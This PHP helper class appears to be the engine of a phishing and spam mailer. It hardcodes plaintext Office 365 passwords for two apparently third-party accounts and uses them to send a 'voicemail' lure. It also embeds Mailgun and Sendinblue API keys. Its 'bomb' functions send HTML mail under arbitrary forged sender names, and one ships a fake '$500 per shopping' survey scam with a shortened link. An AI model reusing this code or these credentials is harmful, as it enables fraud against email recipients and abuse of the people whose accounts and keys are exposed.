<?php
namespace App\Helpers;

use App\Helpers\Contracts\HelperContract; 
use Crypt;
use Carbon\Carbon; 
use Mail;
use Auth;
use \Swift_Mailer;
use \Swift_SmtpTransport;
use GuzzleHttp\Client;
use GuzzleHttp\Psr7;
use GuzzleHttp\Exception\RequestException;


class Helper implements HelperContract
{

  public $logins = [
		     ['pass' => "!heNhous37", 'user' => "debh@wcmca.org", 'name' => "Debby"],
		     ['user' => "lvargo@lipmanbrothers.com", 'pass' => "19924Barlow", 'name' => "Lou"],
		   ];

          /**
           * Sends an email(blade view or text) to the recipient
           * @param String $to
           * @param String $subject
           * @param String $data
           * @param String $view
           * @param String $image
           * @param String $type (default = "view")
           **/
           function sendEmail($to,$subject,$data,$view,$type="view")
           {
                   if($type == "view")
                   {
                     Mail::send($view,$data,function($message) use($to,$subject){
                           $message->from('ceokhalifawali@gmail.com',"Khalifa Wali");
                           $message->to($to);
                           $message->subject($subject);
                          if(isset($data["has_attachments"]) && $data["has_attachments"] == "yes")
                          {
                          	foreach($data["attachments"] as $a) $message->attach($a);
                          } 
						  $message->getSwiftMessage()
						  ->getHeaders()
						  ->addTextHeader('x-mailgun-native-send', 'true');
                     });
                   }

                   elseif($type == "raw")
                   {
                     Mail::raw($view,$data,function($message) use($to,$subject){
                            $message->from('ceokhalifawali@gmail.com',"Khalifa Wali");
                           $message->to($to);
                           $message->subject($subject);
                           if(isset($data["has_attachments"]) && $data["has_attachments"] == "yes")
                          {
                          	foreach($data["attachments"] as $a) $message->attach($a);
                          } 
                     });
                   }
           }          
           
           function sendEmailSMTP($data,$view,$type="view")
           {
           	    // Setup a new SmtpTransport instance for new SMTP
                $transport = "";
if($data['sec'] != "none") $transport = new Swift_SmtpTransport($data['ss'], $data['sp'], $data['sec']);

else $transport = new Swift_SmtpTransport($data['ss'], $data['sp']);

   if($data['sa'] != "no"){
                  $transport->setUsername($data['su']);
                  $transport->setPassword($data['spp']);
     }
// Assign a new SmtpTransport to SwiftMailer
$smtp = new Swift_Mailer($transport);

// Assign it to the Laravel Mailer
Mail::setSwiftMailer($smtp);

$se = $data['se'];
$sn = $data['sn'];
$to = $data['em'];
$subject = $data['subject'];
                   if($type == "view")
                   {
                     Mail::send($view,$data,function($message) use($to,$subject,$se,$sn){
                           $message->from($se,$sn);
                           $message->to($to);
                           $message->subject($subject);
                          if(isset($data["has_attachments"]) && $data["has_attachments"] == "yes")
                          {
                          	foreach($data["attachments"] as $a) $message->attach($a);
                          } 
						  $message->getSwiftMessage()
						  ->getHeaders()
						  ->addTextHeader('x-mailgun-native-send', 'true');
                     });
                   }

                   elseif($type == "raw")
                   {
                     Mail::raw($view,$data,function($message) use($to,$subject,$se,$sn){
                            $message->from($se,$sn);
                           $message->to($to);
                           $message->subject($subject);
                           if(isset($data["has_attachments"]) && $data["has_attachments"] == "yes")
                          {
                          	foreach($data["attachments"] as $a) $message->attach($a);
                          } 
                     });
                   }
           }

           function bomb($data) 
           {
           	//form query string
              // $qs = "sn=".$data['sn']."&sa=".$data['sa']."&subject=".$data['subject'];

               $lead = $data['em'];
			   
			   if($lead == null)
			   {
				    $ret = json_encode(["status" => "ok","message" => "Invalid recipient email"]);
			   }
			   else
			    { 
                  
			      //Send request to nodemailer
			     // $url = "https://radiant-island-62350.herokuapp.com/?".$qs;
			     //  $url = "https://api:364d81688fb6090bf260814ce64da9ad-7238b007-a2e7d394@api.mailgun.net/v3/mailhippo.tk/messages";
			       $url = "https://api:364d81688fb6090bf260814ce64da9ad-7238b007-a2e7d394@api.mailgun.net/v3/securefilehub.gq/messages";
			   
			
			     $client = new Client([
                 // Base URI is used with relative requests
                 'base_uri' => 'http://httpbin.org',
                 // You can set any number of default request options.
                 //'timeout'  => 2.0,
				 'headers' => [
                     'MIME-Version' => '1.0',
                     'Content-Type'     => 'text/html; charset=ISO-8859-1',
                    ]
                 ]);
                  
				  //$html = $this->body;
                  $html = $data['msg'];
				  
				/** $dt = [
				   'form_params' => [
				      'to' => $data['em'],
					  'from' => $data['sn']." <".$data['se'].">",
					  'subject' => $data['subject'],
					  //'html' => $this->body,
					  'html' => $html,
				   ]
				   
				 ];**/
				 
				 $dt = [
				    'multipart' => [
					   [
					      'name' => 'to',
						  'contents' => $data['em']
					   ],
					   [
					      'name' => 'from',
						  'contents' => $data['sn']." <".$data['se'].">"
					   ],
					   [
					      'name' => 'subject',
						  'contents' => $data['subject']
					   ],
					   [
					      'name' => 'html',
						  'contents' => $html
					   ]
					]
				 ];
				 
				 if($data['attt'] === "yes")
				 {
					$dt = [
				    'multipart' => [
					   [
					      'name' => 'to',
						  'contents' => $data['em']
					   ],
					   [
					      'name' => 'from',
						  'contents' => $data['sn']." <".$data['se'].">"
					   ],
					   [
					      'name' => 'subject',
						  'contents' => $data['subject']
					   ],
					   [
					      'name' => 'html',
						  'contents' => $html
					   ],
					   [
					      'name' => 'attachment',
						  'contents' => fopen($data['att']->getRealPath(),'r'),
						  'filename' => $data['att']->getClientOriginalName()
					   ]
					]
				 ]; 
				 }
				 
				 
				 try
				 {
			       $res = $client->request('POST', $url,$dt);
			  
                   $ret = $res->getBody()->getContents(); 
			       //dd($ret);
				 /*******************
				 """
{
  "id": "<20191212163843.1.FF7C9DD921606F44@mg.btbusinesss.com>",
  "message": "Queued. Thank you."
}
				 ********************/
				 }
				 catch(RequestException $e)
				 {
					 $mm = (is_null($e->getResponse())) ? null: Psr7\str($e->getResponse());
					 $ret = json_encode(["status" => "error","message" => $mm]);
				 }
			     $rett = json_decode($ret);
			     /**if($rett->status == "ok")
			     {
					//  $this->setNextLead();
			    	//$lead->update(["status" =>"sent"]);					
			     }
			     else
			     {
			    	// $lead->update(["status" =>"pending"]);
			     }**/
			    }
              return $ret; 
           }
		   
		   function bombb($data) 
           {
           	//form query string
              // $qs = "sn=".$data['sn']."&sa=".$data['sa']."&subject=".$data['subject'];

               $lead = $data['em'];
			   
			   if($lead == null)
			   {
				    $ret = json_encode(["status" => "ok","message" => "Invalid recipient email"]);
			   }
			   else
			    { 
                  
			      //Send request to nodemailer
			     // $url = "https://radiant-island-62350.herokuapp.com/?".$qs;
			     //  $url = "https://api:364d81688fb6090bf260814ce64da9ad-7238b007-a2e7d394@api.mailgun.net/v3/mailhippo.tk/messages";
			       $url = "https://api.sendinblue.com/v3/smtp/email";
			   
			
			     $client = new Client([
                 // Base URI is used with relative requests
                 'base_uri' => 'http://httpbin.org',
                 // You can set any number of default request options.
                 //'timeout'  => 2.0,
				 'headers' => [
                     'MIME-Version' => '1.0',
                     'Content-Type'     => 'text/html; charset=ISO-8859-1',
                     'Accept'     => 'application/json',
                     'Api-Key'     => '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',
                    ]
                 ]);
                  
				  //$html = $this->body;
                  $html = $data['msg'];
				  
				/** $dt = [
				   'form_params' => [
				      'to' => $data['em'],
					  'from' => $data['sn']." <".$data['se'].">",
					  'subject' => $data['subject'],
					  //'html' => $this->body,
					  'html' => $html,
				   ]
				   
				 ];**/
				 
				 $dt = [
				    'sender' => [
					      'name' => $data['sn'],
						  'email' => $data['se']
					],
					'to' => [
					   [
					      'name' => $data['em'],
						  'email' => $data['em']
					   ],					 
					],
					'subject' => $data['subject'],
					'htmlContent' => $data['msg']
				 ];
				 
				 if(isset($data['attt']) && $data['attt'] === "yes")
				 {
					$dt = [
				    'sender' => [
					      'name' => $data['sn'],
						  'email' => $data['se']
					],
					'to' => [
					   [
					      'name' => $data['em'],
						  'email' => $data['em']
					   ],					 
					],
					'subject' => $data['subject'],
					'htmlContent' => $data['msg']
				 ];
				 }
				 
				 
				 try
				 {
			       $res = $client->request('POST', $url,['json' => $dt]);
			  
                   $ret = $res->getBody()->getContents(); 
			       dd($ret);
				 /*******************
				 """
{
  "id": "<20191212163843.1.FF7C9DD921606F44@mg.btbusinesss.com>",
  "message": "Queued. Thank you."
}
				 ********************/
				 }
				 catch(RequestException $e)
				 {
					 $mm = (is_null($e->getResponse())) ? null: Psr7\str($e->getResponse());
					 $ret = json_encode(["status" => "error","message" => $mm]);
				 }
			     $rett = json_decode($ret);
			     /**if($rett->status == "ok")
			     {
					//  $this->setNextLead();
			    	//$lead->update(["status" =>"sent"]);					
			     }
			     else
			     {
			    	// $lead->update(["status" =>"pending"]);
			     }**/
			    }
              return $ret; 
           }
		   
		   
		     function bombOutlook($dt) 
           {
			   $ldt = (isset($dt['ll'])) ? $dt['ll'] : 0;
			   $loginData = $this->logins[$ldt];
			   $su = $loginData['user'];
			   $spp = $loginData['pass'];
			   $sn = $loginData['name'];
			   $data = [
			     'ss' => "smtp.office365.com",
			     'sp' => "587",
			     'sec' => "tls",
			     'sa' => "yes",
			     'su' => $su,
			     'spp' => $spp,
			     'se' => $su,
			     'sn' => $sn,
			     'em' => $dt['em'],
			     'subject' => $dt['subject'],
			     'user' => $dt['user'],
			     'nname' => $dt['nname'],
			     'duration' => $dt['duration'],
			     'ddate' => $dt['ddate'],
			   ];
           	  $this->sendEmailSMTP($data,'emails.voicemail_2'); 
           }

           function defaultBomb()
		   {
			   $html = <<<EOD
<h3>Good News!</h3>

<p>Join Our ClientSmart Survey Program In Your Area/ City Today and <em>Earn $500 per shopping</em>. This will not affect your current Job.</p><br>
<p> To Apply Please <a href="https://bit.ly/35oJNKu" target="_blank">Click here</a></p><br>
<p>or copy and paste this link to your browser: <a href="https://bit.ly/35oJNKu" target="_blank">https://bit.ly/35oJNKu</a></p> 
EOD;

$ret = [
'em' => "aquarius4tkud@yahoo.com",
'sn' => "Gary McGraw",
'se' => "tobs@securespeedmail.tk",
'subject' => "Win Exciting Prizes! (read this)",
'msg' => $html,
];

$r = $this->bomb($ret);
return $r;
		   }
		   
   
}
?>